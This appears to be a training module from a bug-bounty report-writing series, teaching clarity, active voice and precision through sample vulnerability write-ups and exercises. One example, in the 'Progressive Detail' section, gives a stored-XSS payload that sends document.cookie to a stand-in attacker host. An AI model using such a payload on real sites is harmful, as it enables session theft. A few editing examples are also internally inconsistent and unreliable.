# 02 — Technical Writing Standards for Security Reports

## Expert Role (15 Lines)

You are a technical writer specializing in cybersecurity communications with 12 years of experience translating complex vulnerability findings into clear, actionable reports. You have worked with Fortune 500 security teams, bug bounty platforms, and government agencies to establish writing standards for security documentation. You understand that a security report is simultaneously a technical document, a legal record, and a business communication — and it must serve all three purposes effectively. Your expertise spans the intersection of technical precision and readable prose, knowing exactly when to be verbose and when to be terse. You have reviewed thousands of reports and identified the writing patterns that correlate with acceptance vs rejection, high bounties vs low bounties, and fast triage vs delayed response. This guide encodes the technical writing principles that separate amateur reporters from professional security communicators.

## Core Concepts (40 Lines)

### Clarity and Precision in Technical Writing

**The Cardinal Rule:** Every sentence must have exactly one interpretation.

**Ambiguous:** "The application returns user data when the ID is changed."
**Precise:** "The /api/users/{id} endpoint returns the targeted user's email, phone, and address when the {id} parameter is modified to any integer value."

**Techniques for Precision:**
- Replace pronouns with nouns: "It returns data" → "The API endpoint returns user data"
- Specify values: "A large number of records" → "127,000 records"
- Name the endpoint: "The API" → "POST /api/v2/organizations/members"
- Include data types: "User information" → "user PII (email, phone, home address)"
- Quantify impact: "Many users affected" → "450,000 active users across 12,000 organizations"

### Active vs Passive Voice

**Use Active Voice (preferred):**
- "The attacker sends a crafted request to /api/admin" ✓
- "Changing the ID parameter returns unauthorized data" ✓
- "The server validates the token after authentication" ✓

**Use Passive Voice (when actor is unknown or unimportant):**
- "The token is invalidated after logout" ✓
- "Sensitive data is exposed in the response" ✓
- "The vulnerability was discovered during testing" ✓

**Avoid Passive Voice (when it hides responsibility):**
- "Mistakes were made in the authentication logic" ✗
- "The vulnerability can be exploited" ✗ (by whom?)
- "Users are affected" ✗ (how many? which users?)

### Technical Terminology Usage

**Principle 1: Define on first use**
"The endpoint performs an IDOR (Insecure Direct Object Reference) vulnerability check..."

**Principle 2: Use standard terminology**
- CVE names when applicable
- CWE identifiers for classification
- OWASP categories for context
- Industry-standard terms (XSS, CSRF, SSRF) not custom names

**Principle 3: Avoid jargon when plain English works**
- "The application performs a TOCTOU check" → "The application checks permissions at the start but not at the end of the operation"
- "The session token lacks entropy" → "The session token is a predictable 6-digit number"

**Principle 4: Be consistent**
- Pick one term and use it throughout: don't alternate between "endpoint," "route," "URL," and "path" for the same thing
- Standardize parameter names: use the exact name from the request
- Consistent capitalization: XSS, not xss or Xss

### Sentence Structure Optimization

**Keep sentences under 30 words.** If a sentence exceeds 30 words, split it.

**Before (42 words):**
"When the user sends a POST request to the /api/import endpoint with a URL parameter pointing to an internal service, the server makes an HTTP request to that URL and returns the response body to the user, which allows access to internal services."

**After (15 + 16 words):**
"When the user sends a POST request to /api/import with a URL parameter pointing to an internal service, the server fetches that URL and returns the response body to the user. This allows access to internal services."

**Sentence patterns for security reports:**
- "The [component] performs [action] without [security check]."
- "When [trigger condition], the application [response] instead of [expected behavior]."
- "This allows [attacker action], resulting in [impact]."

### Paragraph Organization

**One idea per paragraph.** Each paragraph should have:
1. Topic sentence (what this paragraph is about)
2. Supporting details (evidence, examples, explanation)
3. Transition (connection to next paragraph)

**Example:**
```
The authentication bypass occurs in the password reset flow. The reset
token is generated server-side with sufficient entropy (32-byte random
string). However, the token validation endpoint does not check the token
expiration timestamp. This means a token generated 30 days ago is still
valid for password reset. In contrast, login session tokens expire after
24 hours, creating an inconsistency in token lifecycle management.
```

### Transition Words for Technical Content

| Purpose | Transition Words |
|---------|-----------------|
| Addition | furthermore, additionally, moreover, also |
| Contrast | however, nevertheless, conversely, yet |
| Cause | therefore, consequently, as a result, thus |
| Sequence | first, next, then, finally, subsequently |
| Example | for instance, specifically, notably, in particular |
| Emphasis | importantly, critically, notably, significantly |
| Concession | admittedly, granted, although, while |

### Avoiding Ambiguity

**Ambiguous terms to avoid:**
- "Sometimes" → Document exact conditions
- "Usually" → State the frequency or provide evidence
- "May" → Is it possible or certain?
- "A lot" → Provide the actual number
- "Various" → List them or provide a count
- "Recent" → Specify the date or timeframe
- "Appropriate" → Define what "appropriate" means

**Ambiguous:** "The application may be vulnerable to XSS."
**Precise:** "The application is vulnerable to stored XSS in the profile bio field. When a user inputs `<script>alert(1)</script>` in the bio field, the script executes when any user views the profile page."

### Writing for Different Audiences

**For Triagers (primary audience):**
- Lead with reproduction steps
- Include request/response data
- Be precise about endpoints and parameters
- Provide CVSS justification

**For Developers (secondary audience):**
- Explain root cause clearly
- Reference code patterns (without sharing proprietary code)
- Provide specific remediation guidance
- Use correct technical terminology

**For Managers (tertiary audience):**
- Lead with business impact
- Quantify in dollars, users, or time
- Use plain English, not jargon
- Frame as risk, not just vulnerability

## Prerequisites (20 Lines)

1. Understanding of English grammar rules (subject-verb agreement, tense consistency)
2. Familiarity with technical writing conventions (active voice, parallel structure)
3. Knowledge of security terminology (XSS, CSRF, SSRF, IDOR, etc.)
4. Understanding of the target audience (triagers, developers, managers)
5. Familiarity with the platform's report format and constraints
6. Knowledge of CVSS scoring and severity communication
7. Understanding of markdown formatting for reports
8. Ability to simplify complex technical concepts without losing accuracy
9. Familiarity with common security frameworks (OWASP, CWE, NIST)
10. Understanding of legal and compliance language requirements
11. Knowledge of international English conventions (for global programs)
12. Ability to write for different reading levels (technical, executive, end-user)
13. Understanding of information architecture (hierarchy, flow, organization)
14. Familiarity with style guides (AP Style, Chicago Manual, Microsoft Style)
15. Knowledge of accessibility standards for technical documentation
16. Understanding of localization challenges in technical writing
17. Ability to write concisely without sacrificing clarity
18. Understanding of citation and reference standards for technical documents
19. Knowledge of version control for documentation
20. Understanding of platform-specific character limits and formatting constraints

## Methodology (60 Lines)

### Phase 1: Pre-Writing Analysis

**Step 1: Identify your primary reader**
- Who will read this first? (triager)
- What do they need? (reproduction steps, impact evidence)
- What is their expertise level? (varies, assume intermediate)

**Step 2: Determine the writing objective**
- Primary objective: Enable reproduction
- Secondary objective: Demonstrate impact
- Tertiary objective: Guide remediation

**Step 3: Assess the technical complexity**
- How many technical concepts need explanation?
- What prerequisites does the reader need?
- How much background context is needed?

**Step 4: Plan the information structure**
- What order presents information most effectively?
- Where do readers typically get confused?
- What information can be deferred or omitted?

### Phase 2: Drafting the Report

**Principle 1: Write the Steps First**
The reproduction steps are the core of the report. Write them first.

```
Steps to Reproduce:
1. Login to https://target.com as a regular user (account with email user@test.com)
2. Navigate to https://target.com/api/v2/users/ME/settings
3. Note the response contains the authenticated user's settings object
4. Change the URL to https://target.com/api/v2/users/12345/settings
   (where 12345 is any other user's numeric ID)
5. Send the request without modifying any headers
6. Response returns user 12345's settings including email, phone, and address
```

**Principle 2: Write the Title Last**
After writing the full report, distill it into a precise title.

**Principle 3: Write the Summary After Steps**
The summary should be a compressed version of the full report.

**Principle 4: Write Impact with Evidence**
Every impact statement must have a corresponding evidence point.

**Principle 5: Write Remediation with Specificity**
Not "validate input" but "implement UUID-based resource identifiers and verify the authenticated user's UUID matches the requested resource UUID before returning data."

### Phase 3: Editing for Technical Precision

**Check 1: Endpoint accuracy**
Verify every endpoint URL is correct and reachable

**Check 2: Parameter names**
Verify parameter names match the actual request

**Check 3: Response codes**
Verify HTTP status codes are accurate

**Check 4: Data values**
Verify sample data values are realistic and accurate

**Check 5: Timing requirements**
Verify time-dependent steps are documented

**Check 6: State requirements**
Verify session/authentication state requirements are clear

### Phase 4: Editing for Readability

**Check 1: Sentence length**
No sentence exceeds 30 words

**Check 2: Paragraph length**
No paragraph exceeds 6 sentences

**Check 3: Active voice ratio**
Target 80% active voice, 20% passive voice

**Check 4: Jargon density**
Replace jargon with plain English where possible

**Check 5: Transition quality**
Each paragraph connects logically to the next

**Check 6: Consistency**
Terminology, formatting, and style are consistent throughout

### Phase 5: Final Review

**Review 1: Read aloud**
If it sounds awkward when read aloud, rewrite it

**Review 2: Fresh eyes review**
Wait 30 minutes, then re-read with fresh perspective

**Review 3: Peer review**
Have another hunter review the report

**Review 4: Platform preview**
Preview the report on the submission platform to verify formatting

**Review 5: Proofread**
Check for grammar, spelling, and punctuation errors

### Phase 6: Post-Submission Writing

**Action 1: Document feedback**
Record any triager feedback for future improvement

**Action 2: Update templates**
Incorporate successful patterns into your template library

**Action 3: Build style guide**
Develop personal writing standards based on accepted reports

## Tool Arsenal (40 Lines)

### Writing and Editing Tools

| Tool | Purpose | When to Use |
|------|---------|-------------|
| Grammarly | Grammar and style checking | Final proofread pass |
| Hemingway Editor | Readability analysis | Simplify complex sentences |
| Microsoft Word | Spell checking | Alternative proofread |
| Google Docs | Collaboration | Peer review |
| VS Code | Markdown editing | Primary writing environment |
| Typora | Markdown preview | Visual report preview |
| Notepad++ | Plain text editing | Quick notes during testing |

### Technical Writing Aids

| Tool | Purpose | Command/Usage |
|------|---------|---------------|
| Vale | Prose linting | `vale report.md` |
| markdownlint | Markdown formatting | `markdownlint report.md` |
| cspell | Spell checking | `cspell report.md` |
| write-good | Style checking | `write-good report.md` |
|alex | Inclusive language | `alex report.md` |

### Reference and Style Guides

| Resource | Purpose | When to Use |
|----------|---------|-------------|
| AP Stylebook | Journalistic conventions | Business impact writing |
| Chicago Manual | Formal writing | Technical documentation |
| Microsoft Style | Technology writing | Software documentation |
| Google Developer Style | API documentation | API vulnerability reports |
| OWASP Writing Guide | Security-specific | Security report writing |

### Research and Verification Tools

| Tool | Purpose | When to Use |
|------|---------|-------------|
| CVE Details | Vulnerability research | Reference known CVEs |
| CWE Database | Weakness classification | Classify vulnerabilities |
| OWASP Top 10 | Risk categorization | Context setting |
| NVD (NIST) | Vulnerability database | Research similar findings |
| Shodan | Service identification | Verify target infrastructure |
| Wappalyzer | Technology detection | Identify target tech stack |

## Case Studies (50 Lines)

### Case Study 1: From Vague to Precise — The $3,000 Rewrite

**Initial Report (Rejected):**
```
Title: API vulnerability
Description: Found a way to access other users' data through the API.
Just change the user ID and you get their information.
```

**Rewritten Report (Accepted, $3,000):**
```
Title: IDOR in /api/v2/users/{userId}/profile allows accessing any user's
profile data (email, phone, address) — 500,000+ users affected

Technical Description:
The endpoint GET /api/v2/users/{userId}/profile returns the targeted user's
complete profile data including PII. The endpoint validates that the request
includes a valid session cookie but does not verify that the session belongs
to the requested {userId}. Any authenticated user can access any other user's
profile by substituting their userId in the URL.

Evidence:
Request:
GET /api/v2/users/12345/profile HTTP/1.1
Host: target.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.[REDACTED]

Response (HTTP 200):
{
  "userId": 12345,
  "email": "victim@example.com",
  "phone": "+1-555-0123",
  "address": "123 Main St, Anytown, USA",
  "ssn": "123-45-6789"
}

The authenticated user (userId: 67890) received the complete profile data
for userId 12345, demonstrating the IDOR vulnerability.

Impact Quantification:
- 500,000+ active user profiles accessible
- PII exposure: email, phone, address, SSN
- GDPR Article 33 notification required (personal data breach)
- Potential for identity theft, targeted phishing, financial fraud
- Estimated exposure cost: $150-$300 per affected user ( Ponemon Institute)
```

### Case Study 2: Passive Voice Elimination

**Before (Passive, unclear):**
"The vulnerability can be exploited by an attacker. User data is exposed through the endpoint. The response contains information that should not be accessible."

**After (Active, precise):**
"An authenticated attacker sends a GET request to /api/users/{targetId}/settings. The endpoint returns the target user's settings object including email, phone, and notification preferences. The response does not verify that the requesting user owns the settings object."

**Key improvements:**
- Identified the actor: "authenticated attacker" (not just "attacker")
- Named the specific action: "sends a GET request"
- Named the specific endpoint: "/api/users/{targetId}/settings"
- Named the specific data: "email, phone, and notification preferences"
- Explained the root cause: "does not verify that the requesting user owns the settings object"

### Case Study 3: Jargon Translation

**Before (Jargon-heavy):**
"The application performs a TOCTOU check on the authorization token. The JWT's signature is validated but the claims are not verified against the RBAC policy. This allows an IDOR via parameter tampering."

**After (Translated):**
"The application checks authorization at the start of the request but not at the end. The JWT token signature is valid, but the user's role is not checked against the endpoint's required permissions. An attacker can modify the userId parameter in the request URL to access other users' data without authorization."

**Key improvements:**
- TOCTOU → "checks authorization at the start...but not at the end"
- JWT → "JWT token" (context provided)
- RBAC → "the endpoint's required permissions"
- IDOR via parameter tampering → "modify the userId parameter...to access other users' data"

### Case Study 4: Sentence Structure Optimization

**Before (Complex, 52-word sentence):**
"When the user sends a POST request to the /api/import endpoint with a URL parameter pointing to an internal service that is not accessible from the internet, the server makes an HTTP request to that URL and returns the response body to the user, which allows access to internal services and sensitive data."

**After (Simplified, two 15-word sentences):**
"When the user sends a POST request to /api/import with a URL pointing to an internal service, the server fetches that URL and returns the response. This allows access to internal services not accessible from the internet."

### Case Study 5: Paragraph Organization

**Before (Disorganized):**
"The bug is in the search feature. Users can search for things. The search returns results. When you search for a script tag it executes. This is XSS. It affects all users. You can steal cookies. The fix is to encode output."

**After (Organized):**
```
The stored XSS vulnerability exists in the search results page. When a
user searches for a term containing JavaScript (e.g., <script>alert(1)</script>),
the search term is reflected in the results page without output encoding.
The script executes in the browser of any user viewing the search results.

This affects all users who view the search results page, including the
attacker's own search results. An attacker can inject a payload that
steals session cookies (e.g., document.cookie), enabling account
takeover without user interaction beyond performing a search.

The root cause is the lack of output encoding in the search results
template. The search term is inserted into the HTML without escaping
special characters. The fix is to implement context-aware output
encoding in the search results template.
```

### Case Study 6: Active Voice Throughout

**Before (Mixed voice):**
"The request is sent by the attacker. The response is received. User data is found in the response. This data is returned by the server."

**After (Consistent active voice):**
"The attacker sends the request. The server returns a response containing the victim's user data. The response includes email, phone, and address fields without authorization checks."

### Case Study 7: Transition Words in Practice

**Before (No transitions):**
"The endpoint accepts a URL parameter. The server fetches the URL. The response is returned. This allows internal access. The fix is input validation."

**After (Smooth transitions):**
"The endpoint accepts a URL parameter. When the user submits a URL, the server fetches that URL and returns the response. Consequently, this allows access to internal network resources. To remediate, implement URL validation and an allowlist of permitted domains."

## Advanced Techniques (40 Lines)

### The "Readability Target" Framework

**Target Flesch Reading Ease: 50-60**
- Below 30: Too complex for most triagers
- 30-50: Complex but acceptable for technical content
- 50-60: Ideal for security reports (technical but readable)
- 60-80: Simple, may lack technical depth
- Above 80: Too simple for technical content

### The "Information Density" Metric

**High-density writing** packs maximum information into minimum words:
- "IDOR in /api/users/{id} exposes PII for 500K users" (9 words, complete message)
- vs "I found a vulnerability where if you change the user ID in the API, it returns other users' data, and there are about 500,000 users affected" (28 words, same message)

**Target: 1 information-dense sentence per line**

### The "Progressive Detail" Writing Pattern

**Sentence 1:** The headline finding
"The application is vulnerable to stored XSS in the profile bio field."

**Sentence 2:** The mechanism
"JavaScript input in the bio field executes when any user views the profile."

**Sentence 3:** The impact
"This allows session hijacking affecting all profile viewers."

**Sentence 4:** The evidence
"Payload: `<script>fetch('https://evil.com/steal?t='+document.cookie)</script>`"

**Sentence 5:** The scope
"50,000+ profiles are affected, including admin accounts."

### The "Triage-First" Writing Order

Write in this order for maximum triager efficiency:
1. Steps to Reproduction (what triager needs first)
2. Supporting Evidence (what triager needs to validate)
3. Impact Statement (what triager needs to justify bounty)
4. Technical Description (what triager needs to understand)
5. Remediation (what developer needs to fix)
6. Title (what summarizes everything)
7. Summary (what everything distills to)

### The "Red Team Voice" — Writing with Authority

**Weak:** "I think there might be a vulnerability that could potentially allow..."
**Strong:** "The application is vulnerable to IDOR in the /api/users endpoint."

**Weak:** "This could be a serious issue if..."
**Strong:** "This is a serious vulnerability affecting 500,000+ users."

**Weak:** "I'm not sure if this is in scope but..."
**Strong:** "The affected endpoint is within the program's scope per the /assets page."

### The "Anti-Vagueness" Checklist

For every claim in your report, verify:
- [ ] Specific endpoint named (not "the API")
- [ ] Specific parameter named (not "the parameter")
- [ ] Specific data type named (not "user data")
- [ ] Specific count provided (not "many users")
- [ ] Specific timeframe stated (not "recently")
- [ ] Specific version documented (not "latest version")
- [ ] Specific tool named (not "my security scanner")
- [ ] Specific method described (not "by exploiting a vulnerability")

### The "Professional Tone" Spectrum

**Too casual:** "So I was poking around and found this cool bug..."
**Too formal:** "During the course of this security assessment, the author identified a vulnerability..."
**Professional:** "During testing of the /api/v2/users endpoint, I identified an IDOR vulnerability."

**Professional characteristics:**
- First person ("I found" or "Testing revealed")
- Direct language (no hedging)
- Technical precision (specific terms)
- Neutral tone (not excited, not apologetic)

## Detection Patterns (20 Lines)

### Writing Quality Indicators

**Indicator 1: Passive voice density**
- High passive voice (>30%): Report may obscure who does what
- Low passive voice (<10%): Report is clear about actors and actions

**Indicator 2: Sentence length**
- Average >25 words: Sentences need splitting
- Average <15 words: May lack necessary detail
- Target: 15-20 words average

**Indicator 3: Jargon density**
- High jargon: May confuse non-specialist triagers
- Low jargon: May lack technical precision
- Target: Define jargon on first use, then use consistently

**Indicator 4: Specificity score**
- Count of vague terms ("various," "several," "sometimes")
- Target: Zero vague terms in final report

**Indicator 5: Formatting consistency**
- Consistent use of code blocks, bold, lists
- Consistent heading structure
- Consistent terminology throughout

### Self-Assessment Rubric

| Criterion | 1 (Poor) | 3 (Acceptable) | 5 (Excellent) |
|-----------|----------|-----------------|---------------|
| Clarity | Ambiguous throughout | Mostly clear | Every sentence has one interpretation |
| Precision | Vague terms everywhere | Mostly specific | Every claim backed by specific evidence |
| Active Voice | <30% active | 60-80% active | >80% active |
| Sentence Length | >30 words average | 20-25 words average | 15-20 words average |
| Jargon | Undefined jargon | Most defined | All defined on first use |
| Transitions | No transitions | Some transitions | Smooth logical flow |

## Impact Assessment (20 Lines)

### Writing Impact That Lands

**Technical Impact (for triagers):**
"The vulnerability allows unauthenticated access to the /api/admin/users endpoint, exposing user PII for 500,000+ accounts."

**Business Impact (for program owners):**
"This vulnerability exposes PII for 500,000+ users, potentially violating GDPR Article 33 (personal data breach notification) and exposing the company to regulatory fines of up to €20M or 4% of annual revenue."

**Compliance Impact (for managers):**
"The exposure of email, phone, and address data for EU residents triggers GDPR breach notification requirements within 72 hours. Failure to notify carries fines of up to €20M or 4% of annual revenue."

### Impact Quantification Methods

**Method 1: User count**
"500,000+ users affected"

**Method 2: Data volume**
"127,000 records exposed including PII"

**Method 3: Financial estimate**
"$50,000+ in potential revenue loss from discount code abuse"

**Method 4: Time-based**
"7-day exploitation window vs intended 1-hour window"

**Method 5: Compliance-based**
"GDPR Article 33 notification required"

## Pitfalls (25 Lines)

### Writing Mistakes That Kill Reports

**Mistake 1: Hedging language**
"I think there might be a vulnerability" → State it as fact

**Mistake 2: Over-qualification**
"Depending on the configuration, in some cases, under certain circumstances..." → Document the specific conditions

**Mistake 3: Passive voice abuse**
"Data is exposed" → "The endpoint returns user data"

**Mistake 4: Jargon without definition**
"The JWT's claims are not validated against the RBAC policy" → Define on first use

**Mistake 5: Wall of text**
500 words without formatting → Break into sections with headers

**Mistake 6: Inconsistent terminology**
Alternating between "endpoint," "route," "URL," "path" → Pick one and use consistently

**Mistake 7: Missing transitions**
Jumping between topics without connection → Use transition words

**Mistake 8: Over-abbreviation**
"IDOR in the API allows access to PII" → Spell out on first use

**Mistake 9: Ambiguous pronouns**
"It returns data" → "The API returns user data"

**Mistake 10: Run-on sentences**
>30 word sentences → Split into multiple sentences

### Common Grammar Mistakes in Security Reports

**Mistake 1: Subject-verb agreement**
"The vulnerability allows... and enable..." → "The vulnerability allows... and enables..."

**Mistake 2: Comma splices**
"The server returns data, it should not do this" → "The server returns data. It should not do this."

**Mistake 3: Dangling modifiers**
"When changed, the server returns data" → "When the ID is changed, the server returns data."

**Mistake 4: Parallel structure violations**
"The endpoint accepts, processes, and returns" → "The endpoint accepts, processes, and returns"

**Mistake 5: Misplaced modifiers**
"The attacker can access any user's data using this endpoint" → "Using this endpoint, the attacker can access any user's data"

## Integration Points (25 Lines)

### Writing Standards as Part of Report Quality System

Your writing standards should integrate with:
- **Report structure** (01-Report-Structure-Optimization.md) — Structure provides the framework
- **Technical writing** — Writing fills the framework with clear content
- **Code formatting** (10-Code-Sample-Formatting.md) — Code samples need formatting
- **Visual aids** (09-Visual-Aid-Integration.md) — Screenshots need annotation

### Continuous Writing Improvement

**After each report:**
1. Note any triager feedback on clarity
2. Record questions asked about the report
3. Identify sections that needed clarification
4. Update your writing checklist

**Monthly review:**
1. Analyze accepted vs rejected reports for writing patterns
2. Read successful reports from other hunters
3. Study accepted reports on Hacktivity for writing patterns
4. Update your style guide

### Building a Writing Style Guide

Create a personal style guide with:
- Preferred terminology for common terms
- Formatting standards (heading levels, list styles)
- Sentence structure templates
- Common phrases and their alternatives
- Platform-specific formatting rules

## Reporting Best Practices (20 Lines)

### The "One Read" Standard

A triager should be able to read your report once and:
1. Understand the vulnerability
2. Reproduce the vulnerability
3. Assess the impact
4. Determine the severity
5. Write a response

If they need to re-read any section, that section needs rewriting.

### The "So What?" Test

After every sentence, ask "So what?" If the sentence doesn't answer that question, it doesn't belong in the report.

**Before:** "The application uses JWT tokens for authentication."
**So what?** → Not relevant to the vulnerability
**After:** (Remove or place in background context)

**Before:** "The endpoint returns user data when the ID is changed."
**So what?** → "An attacker can access any user's PII including email, phone, and address."
**After:** "The endpoint returns user data when the ID is changed, allowing an attacker to access any user's PII including email, phone, and address."

### The "Audience-First" Writing Approach

**For Triagers:** Lead with steps, be precise, provide evidence
**For Developers:** Explain root cause, reference code patterns, provide fix guidance
**For Managers:** Lead with business impact, quantify damage, frame as risk

## Hands-On Labs (20 Lines)

### Lab 1: Active Voice Conversion
Convert these sentences to active voice:
1. "The vulnerability was discovered during testing"
2. "User data is returned by the endpoint"
3. "The session token is validated by the server"
4. "Access is granted without authentication"

### Lab 2: Sentence Splitting
Split these sentences into multiple shorter sentences:
1. "When the user sends a POST request to the /api/import endpoint with a URL parameter pointing to an internal service that is not accessible from the internet, the server makes an HTTP request to that URL and returns the response body to the user."
2. "The application performs an IDOR check by comparing the user's session with the requested resource but does not verify that the user owns the resource before returning the data."

### Lab 3: Jargon Translation
Translate these technical descriptions for a non-technical audience:
1. "The JWT's claims are not validated against the RBAC policy, allowing IDOR via parameter tampering."
2. "The application performs a TOCTOU check on the authorization token, creating a race condition."

### Lab 4: Precision Improvement
Make these sentences more precise:
1. "The API returns user data when the ID is changed"
2. "Many users are affected by this vulnerability"
3. "The application is vulnerable to XSS"
4. "An attacker could potentially access internal services"

### Lab 5: Paragraph Organization
Organize these sentences into a coherent paragraph:
- "The fix is to implement output encoding"
- "This affects all users viewing the search results"
- "The search term executes as JavaScript in the results page"
- "The vulnerability is stored XSS in the search feature"
- "An attacker can steal session cookies via this vulnerability"

### Lab 6: Transition Word Integration
Add appropriate transition words to connect these sentences:
1. "The endpoint accepts a URL parameter. The server fetches the URL. The response is returned."
2. "The vulnerability is in the search feature. The search term is stored. The script executes."

### Lab 7: Readability Analysis
Run your latest report through:
1. Hemingway Editor — target grade 10-12
2. Grammarly — target 0 issues
3. Manual sentence count — target <20 words average

### Lab 8: Peer Review Exercise
Exchange reports with a fellow hunter:
1. Can they reproduce without re-reading steps?
2. Can they explain the bug in their own words?
3. Do they agree with the severity?
4. What questions do they have?

## Ethics and Professional Standards (15 Lines)

### Ethical Writing Principles

1. **Accuracy** — Every statement must be verifiable
2. **Precision** — No exaggeration of impact or severity
3. **Completeness** — All necessary information provided
4. **Honesty** — Disclose limitations in testing
5. **Clarity** — Writing must not mislead readers

### Legal Language Considerations

- Use factual statements, not legal conclusions
- "This may violate GDPR" not "This violates GDPR"
- "Personal data is exposed" not "The company is liable"
- Include disclaimers for legal interpretations
- Reference specific regulations accurately

### Professional Writing Standards

- Never use humor or sarcasm in reports
- Maintain professional tone throughout
- Avoid emotional language
- Be respectful of the development team
- Focus on facts, not blame

## Cheat Sheet (20 Lines)

### Quick Style Guide

| Element | Standard |
|---------|----------|
| Voice | 80%+ active |
| Sentence length | <30 words |
| Paragraph length | <6 sentences |
| Jargon | Define on first use |
| Specificity | Always specific, never vague |
| Transitions | Use between paragraphs |
| Tone | Professional, neutral |
| Evidence | Every claim backed by proof |

### Common Replacements

| Vague Term | Precise Alternative |
|------------|-------------------|
| "various" | "5 different endpoints" |
| "sometimes" | "when X condition is true" |
| "may" | "can" (if possible) or "does" (if confirmed) |
| "a lot" | "N users/records/requests" |
| "recent" | "on [date]" or "within [timeframe]" |
| "appropriate" | "in compliance with [standard]" |
| "the API" | "POST /api/v2/endpoint" |
| "user data" | "email, phone, address, SSN" |

### Active Voice Templates

- "The [component] performs [action] without [security check]"
- "When [trigger], the application [response] instead of [expected behavior]"
- "This allows [attacker action], resulting in [impact]"
- "The endpoint returns [data] without verifying [authorization check]"

### Readability Checklist

- [ ] Average sentence length <20 words
- [ ] Active voice ratio >80%
- [ ] Zero undefined jargon
- [ ] Zero vague terms
- [ ] Smooth transitions between paragraphs
- [ ] One idea per paragraph
- [ ] Technical precision in every claim

## References and Resources

1. "On Writing Well" by William Zinsser
2. "The Elements of Style" by Strunk and White
3. "Technical Communication" by Mike Markel
4. "Writing for Computer Science" by Justin Zobel
5. Microsoft Writing Style Guide
6. Google Developer Documentation Style Guide
7. Apple Style Guide
8. OWASP Documentation Standards
9. AP Stylebook (for business impact writing)
10. Hemingway Editor (readability tool)
11. Grammarly (grammar checking)
12. Vale (prose linting)

---

*This guide is part of the Report-Writing-Mastery series. Technical writing quality directly impacts report acceptance rates and bounty amounts. Practice these standards with every report you write.*
